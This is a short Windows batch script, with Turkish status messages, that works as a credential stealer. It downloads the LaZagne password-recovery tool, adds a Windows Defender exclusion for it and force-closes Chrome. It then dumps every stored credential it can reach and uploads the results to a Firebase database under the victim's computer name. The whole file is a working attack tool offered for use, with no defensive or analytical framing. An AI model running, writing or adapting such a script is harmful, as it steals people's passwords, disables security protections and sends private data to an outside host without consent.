@echo on
setlocal enabledelayedexpansion
set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"

echo [*] Script basladi: %DATE% %TIME%

if exist "%LAZ_EXE%" del /f /q "%LAZ_EXE%"
powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"

powershell -Command "try { Add-MpPreference -ExclusionProcess '%LAZ_EXE%' } catch {}"

taskkill /IM chrome.exe /F >nul 2>&1

if not exist "%RESULT_DIR%" mkdir "%RESULT_DIR%"

"%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"

for %%F in ("%RESULT_DIR%\*") do (
    powershell -Command ^
      "$content = Get-Content -Raw -Path '%%F'; ^
       Invoke-RestMethod -Uri '%FIREBASE_URL%/%%~nxF.json' -Method PUT -Body $content"
)

echo [*] Tamamlandi: %DATE% %TIME%
pause
exit /b 0
